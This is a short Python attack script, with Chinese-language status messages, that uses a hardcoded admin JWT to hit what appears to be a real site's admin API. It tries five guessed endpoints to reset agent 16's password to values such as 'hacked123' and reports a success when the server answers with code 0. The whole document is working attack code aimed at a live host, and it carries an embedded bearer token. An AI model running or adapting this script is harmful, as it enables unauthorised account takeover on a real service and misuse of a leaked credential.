import requests
import json

BRAND_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dwYXBpLmxkanptci50b3AvYWRtaW4vbG9naW4iLCJpYXQiOjE3NzEwODE4MzUsImV4cCI6MTgwMjYxNzgzNSwibmJmIjoxNzcxMDgxODM1LCJqdGkiOiJjanhlR0lxSDBQdUtlcXJJIiwic3ViIjoiMTEiLCJwcnYiOiI3MjM0OWFmZmRhMDQ0ZGMyYWQ3MGEzOWVmMTUxNjNlYTY3YTczMzEzIn0.m2TZ7MslenA76BRIfbxEhY4BlF0L2HesnX50d0FAGMA"
BASE_URL = "https://wpapi.ldjzmr.top"

headers = {
    "Authorization": f"Bearer {BRAND_TOKEN}",
    "Content-Type": "application/json"
}

agent_id = 16

print("🔥 嘗試重置代理密碼\n")

reset_attempts = [
    ('POST', f"/admin/agent/{agent_id}/reset_password", {'new_password': 'hacked123'}),
    ('POST', f"/admin/agent/reset_password", {'id': agent_id, 'password': 'hacked123'}),
    ('PUT', f"/admin/agent/{agent_id}", {'password': 'hacked123'}),
    ('PUT', f"/admin/agent/{agent_id}", {'machine_password': '999999'}),
    ('PATCH', f"/admin/agent/{agent_id}", {'password': 'test123'}),
]

for method, endpoint, payload in reset_attempts:
    print(f"測試: {method} {endpoint}")
    
    try:
        if method == 'POST':
            response = requests.post(f"{BASE_URL}{endpoint}", headers=headers, json=payload)
        elif method == 'PUT':
            response = requests.put(f"{BASE_URL}{endpoint}", headers=headers, json=payload)
        elif method == 'PATCH':
            response = requests.patch(f"{BASE_URL}{endpoint}", headers=headers, json=payload)
        
        print(f"  狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"  回應: {data}")
            
            if data.get('code') == 0:
                print(f"  ✅ 密碼重置成功！")
    except Exception as e:
        print(f"  錯誤: {e}")
    
    print()